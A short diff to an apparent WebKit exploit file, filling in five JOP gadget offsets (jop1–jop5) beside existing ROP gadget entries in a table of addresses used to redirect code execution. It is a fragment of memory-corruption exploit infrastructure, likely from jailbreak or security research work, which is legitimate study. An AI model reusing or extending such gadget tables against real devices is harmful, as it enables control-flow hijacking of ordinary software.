@@ -112,11 +112,11 @@ const webkit_gadget_offsets = new Map(Object.entries({
     'mov dword ptr [rdi], eax; ret' : 0x000000000000613c, // `89 07 c3`
     'mov dword ptr [rax], esi; ret' : 0x00000000005c3482, // `89 30 c3`
 
-    [jop1] : 0x0000000000000000, // ``
-    [jop2] : 0x0000000000000000, // ``
-    [jop3] : 0x0000000000000000, // ``
-    [jop4] : 0x0000000000000000, // ``
-    [jop5] : 0x0000000000000000, // ``
+    [jop1] : 0x0000000000f2c778, // ``
+    [jop2] : 0x0000000002c326c2, // ``
+    [jop3] : 0x0000000000683800, // ``
+    [jop4] : 0x0000000000303906, // ``
+    [jop5] : 0x000000000004e293, // ``
 }));
 
 const libc_gadget_offsets = new Map(Object.entries({
